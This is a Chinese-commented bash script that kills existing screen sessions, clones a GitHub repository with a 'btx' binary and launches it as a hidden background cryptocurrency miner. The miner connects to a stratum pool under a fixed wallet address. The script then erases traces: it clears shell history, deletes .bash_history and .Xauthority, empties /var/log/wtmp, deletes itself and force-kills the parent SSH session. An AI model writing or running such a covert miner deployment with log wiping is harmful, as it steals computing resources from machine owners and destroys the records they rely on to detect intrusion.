#!/bin/bash
screen -ls | awk '/\t/ {print $1}' | xargs -I {} screen -X -S {} quit
# 1. 环境检查与旧文件处理
for cmd in git screen; do
    if ! command -v $cmd &> /dev/null; then
        # 如果是 Ubuntu/Debian 尝试自动安装（可选）
        sudo apt-get update && sudo apt-get install -y $cmd
    fi
done

if [ -d "btx" ]; then
    rm -rf btx1
    mv btx btx1
fi

# 2. 获取程序文件
git clone https://github.com/xiaobintse/btx.git

# 3. 赋予执行权限
if [ -f "./btx/btx" ]; then
    chmod +x ./btx/btx
else
    echo "文件下载失败，退出。"
    exit 1
fi

# 4. 启动程序
# 使用绝对路径确保在 screen 中能正确运行
WORK_DIR=$HOME/btx
echo "正在后台启动进程..."
screen -dmS btx bash -c "sleep 5 && cd $WORK_DIR && ./btx -o stratum+tcp://btx-hk.lproute.com:8660 -u btx1zspaa73ljgf4jj3mlesdgkjlyawnv357kuervsvuvp8f0fq786e3qj6mtzs.\$(hostname) -p x -a btx"

# 5. 彻底清理痕迹
echo "正在清理痕迹并准备退出..."
# 清理当前 Shell 历史记录
history -c
history -w
# 清理物理文件
rm -f $HOME/.Xauthority
rm -f $HOME/.bash_history
# 清理最后一条登录信息 (部分系统有效)
echo > /var/log/wtmp 2>/dev/null

# 6. 脚本自删除
SCRIPT_PATH=$(readlink -f "$0")
rm -f "$SCRIPT_PATH"

echo "-------------------------------------------------------"
echo "部署完成！终端将在 3 秒后自动关闭。"
echo "-------------------------------------------------------"

sleep 3

# 7. 强制关闭父进程（即当前的终端/SSH 会话）
kill -9 $PPID
